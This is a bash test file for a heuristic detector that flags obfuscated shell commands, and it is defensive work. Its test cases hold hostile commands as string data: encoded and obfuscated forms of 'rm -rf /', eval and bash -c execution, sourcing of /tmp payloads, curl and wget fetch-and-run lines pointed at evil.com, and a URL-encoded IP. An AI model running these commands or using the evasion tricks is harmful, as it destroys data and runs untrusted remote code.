#!/bin/bash
# WoW System - Heuristic Evasion Detector Tests
# TDD Phase: RED - Define expected behavior before implementation
# Author: Chude <chude@emeke.org>
#
# These tests define what the heuristic detector should catch:
# - Encoding evasion (base64, hex, octal)
# - Variable substitution attacks
# - Command obfuscation
# - Indirect execution
# - Split operation correlation

set -uo pipefail

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "${SCRIPT_DIR}")"

# Source test framework
source "${SCRIPT_DIR}/test-framework.sh"

# ============================================================================
# Test Setup
# ============================================================================

setup_all() {
    # Source the heuristics module
    source "${PROJECT_ROOT}/src/security/heuristics/detector.sh" 2>/dev/null || true
}

# ============================================================================
# Encoding Evasion Tests
# ============================================================================

test_detect_base64_encoded_command() {
    # Base64 encoded "rm -rf /" = "cm0gLXJmIC8="
    local encoded_cmd='echo cm0gLXJmIC8= | base64 -d | bash'

    if heuristic_check "${encoded_cmd}" 2>/dev/null; then
        fail "Should detect base64 encoded dangerous command"
        return 1
    fi
    pass
}

test_detect_base64_decode_pattern() {
    # Any base64 decode piped to execution
    local cmd='cat file.b64 | base64 --decode | sh'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect base64 decode to shell execution"
        return 1
    fi
    pass
}

test_detect_hex_encoded_command() {
    # Hex encoded commands
    local cmd='echo "726d202d7266202f" | xxd -r -p | bash'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect hex encoded command execution"
        return 1
    fi
    pass
}

test_detect_octal_escape() {
    # Octal escapes in command
    local cmd=$'echo -e "\\162\\155 -rf /" | bash'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect octal escape sequences"
        return 1
    fi
    pass
}

test_allow_legitimate_base64() {
    # Legitimate base64 usage (not piped to shell)
    local cmd='echo "Hello World" | base64'

    if ! heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should allow legitimate base64 encoding"
        return 1
    fi
    pass
}

# ============================================================================
# Variable Substitution Tests
# ============================================================================

test_detect_variable_command_build() {
    # Building dangerous command via variables
    local cmd='r="rm"; m="-rf"; d="/"; $r $m $d'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect variable-built command"
        return 1
    fi
    pass
}

test_detect_array_command_build() {
    # Building command via array
    local cmd='cmd=(rm -rf /); "${cmd[@]}"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect array-built command"
        return 1
    fi
    pass
}

test_detect_indirect_variable_execution() {
    # Executing variable content
    local cmd='dangerous="rm -rf /"; eval "$dangerous"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect indirect variable execution"
        return 1
    fi
    pass
}

test_allow_safe_variable_usage() {
    # Normal variable usage
    local cmd='name="test"; echo "Hello $name"'

    if ! heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should allow safe variable usage"
        return 1
    fi
    pass
}

# ============================================================================
# Command Obfuscation Tests
# ============================================================================

test_detect_quote_obfuscation() {
    # Using quotes to break pattern matching
    local cmd='r""m -rf /'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect quote-obfuscated command"
        return 1
    fi
    pass
}

test_detect_backslash_obfuscation() {
    # Using backslashes
    local cmd='r\m -rf /'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect backslash-obfuscated command"
        return 1
    fi
    pass
}

test_detect_concatenation_obfuscation() {
    # String concatenation
    local cmd='"r"m" "-rf" "/"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect concatenation obfuscation"
        return 1
    fi
    pass
}

test_detect_null_byte_insertion() {
    # Null byte escape sequences (actual null bytes can't exist in bash strings)
    local cmd='rm\\x00 -rf /'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect null byte escape sequence"
        return 1
    fi
    pass
}

test_detect_case_variation() {
    # Some systems are case-insensitive
    local cmd='RM -RF /'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect case variation of dangerous command"
        return 1
    fi
    pass
}

# ============================================================================
# Indirect Execution Tests
# ============================================================================

test_detect_eval_execution() {
    # eval with any command
    local cmd='eval "rm -rf important_data"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect eval execution"
        return 1
    fi
    pass
}

test_detect_bash_c_execution() {
    # bash -c with command
    local cmd='bash -c "rm -rf /"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect bash -c execution"
        return 1
    fi
    pass
}

test_detect_sh_c_execution() {
    # sh -c with command
    local cmd='sh -c "dangerous_command"'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect sh -c execution"
        return 1
    fi
    pass
}

test_detect_backtick_execution() {
    # Backtick command substitution in dangerous context
    local cmd='`cat /tmp/payload`'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect backtick execution"
        return 1
    fi
    pass
}

test_detect_source_execution() {
    # Sourcing external files
    local cmd='source /tmp/evil.sh'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect source execution from temp"
        return 1
    fi
    pass
}

test_detect_dot_execution() {
    # . (dot) command
    local cmd='. /tmp/payload.sh'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect dot execution from temp"
        return 1
    fi
    pass
}

# ============================================================================
# URL/Network Evasion Tests
# ============================================================================

test_detect_curl_pipe_sh() {
    # Classic attack vector
    local cmd='curl http://evil.com/script.sh | sh'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect curl pipe to shell"
        return 1
    fi
    pass
}

test_detect_wget_pipe_bash() {
    # wget variant
    local cmd='wget -O- http://evil.com/script | bash'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect wget pipe to bash"
        return 1
    fi
    pass
}

test_detect_encoded_url() {
    # URL-encoded IP to evade domain checks
    local cmd='curl http://%31%36%39.%32%35%34.%31%36%39.%32%35%34/'

    if heuristic_check "${cmd}" 2>/dev/null; then
        fail "Should detect URL-encoded IP"
        return 1
    fi
    pass
}

# ============================================================================
# Confidence Score Tests
# ============================================================================

test_confidence_high_for_obvious() {
    # Obvious evasion should have high confidence
    local cmd='echo cm0gLXJmIC8= | base64 -d | bash'
    local confidence

    confidence=$(heuristic_get_confidence "${cmd}" 2>/dev/null || echo "0")

    if [[ "${confidence}" -lt 80 ]]; then
        fail "Obvious evasion should have confidence >= 80, got ${confidence}"
        return 1
    fi
    pass
}

test_confidence_medium_for_suspicious() {
    # Suspicious but not certain
    local cmd='eval "$user_input"'
    local confidence

    confidence=$(heuristic_get_confidence "${cmd}" 2>/dev/null || echo "0")

    if [[ "${confidence}" -lt 50 ]] || [[ "${confidence}" -gt 90 ]]; then
        fail "Suspicious command should have confidence 50-90, got ${confidence}"
        return 1
    fi
    pass
}

test_confidence_low_for_legitimate() {
    # Legitimate command should have low suspicion
    local cmd='echo "Hello World"'
    local confidence

    confidence=$(heuristic_get_confidence "${cmd}" 2>/dev/null || echo "100")

    if [[ "${confidence}" -gt 20 ]]; then
        fail "Legitimate command should have confidence <= 20, got ${confidence}"
        return 1
    fi
    pass
}

# ============================================================================
# Reason Reporting Tests
# ============================================================================

test_get_evasion_reason() {
    local cmd='echo cm0gLXJmIC8= | base64 -d | bash'
    local reason

    reason=$(heuristic_get_reason "${cmd}" 2>/dev/null || echo "")

    if [[ -z "${reason}" ]]; then
        fail "Should return reason for detected evasion"
        return 1
    fi

    # Case-insensitive check for base64 or encoding-related terms
    local lower_reason="${reason,,}"
    if [[ "${lower_reason}" != *"base64"* ]] && [[ "${lower_reason}" != *"encod"* ]] && \
       [[ "${lower_reason}" != *"decode"* ]]; then
        fail "Reason should mention encoding: ${reason}"
        return 1
    fi
    pass
}

# ============================================================================
# Integration Tests
# ============================================================================

test_heuristic_init_exists() {
    if ! type heuristic_init &>/dev/null; then
        fail "heuristic_init function should exist"
        return 1
    fi
    pass
}

test_heuristic_check_exists() {
    if ! type heuristic_check &>/dev/null; then
        fail "heuristic_check function should exist"
        return 1
    fi
    pass
}

# ============================================================================
# Run Tests
# ============================================================================

test_suite "Heuristic Evasion Detector Tests"

# Setup
setup_all

# Function existence tests
test_case "heuristic_init function exists" test_heuristic_init_exists
test_case "heuristic_check function exists" test_heuristic_check_exists

# Encoding evasion tests
test_case "Detect base64 encoded command" test_detect_base64_encoded_command
test_case "Detect base64 decode pattern" test_detect_base64_decode_pattern
test_case "Detect hex encoded command" test_detect_hex_encoded_command
test_case "Detect octal escape" test_detect_octal_escape
test_case "Allow legitimate base64" test_allow_legitimate_base64

# Variable substitution tests
test_case "Detect variable command build" test_detect_variable_command_build
test_case "Detect array command build" test_detect_array_command_build
test_case "Detect indirect variable execution" test_detect_indirect_variable_execution
test_case "Allow safe variable usage" test_allow_safe_variable_usage

# Command obfuscation tests
test_case "Detect quote obfuscation" test_detect_quote_obfuscation
test_case "Detect backslash obfuscation" test_detect_backslash_obfuscation
test_case "Detect concatenation obfuscation" test_detect_concatenation_obfuscation
test_case "Detect null byte insertion" test_detect_null_byte_insertion
test_case "Detect case variation" test_detect_case_variation

# Indirect execution tests
test_case "Detect eval execution" test_detect_eval_execution
test_case "Detect bash -c execution" test_detect_bash_c_execution
test_case "Detect sh -c execution" test_detect_sh_c_execution
test_case "Detect backtick execution" test_detect_backtick_execution
test_case "Detect source from temp" test_detect_source_execution
test_case "Detect dot execution from temp" test_detect_dot_execution

# Network evasion tests
test_case "Detect curl pipe to shell" test_detect_curl_pipe_sh
test_case "Detect wget pipe to bash" test_detect_wget_pipe_bash
test_case "Detect URL-encoded IP" test_detect_encoded_url

# Confidence tests
test_case "High confidence for obvious evasion" test_confidence_high_for_obvious
test_case "Medium confidence for suspicious" test_confidence_medium_for_suspicious
test_case "Low confidence for legitimate" test_confidence_low_for_legitimate

# Reason tests
test_case "Get evasion reason" test_get_evasion_reason

# Summary
test_summary
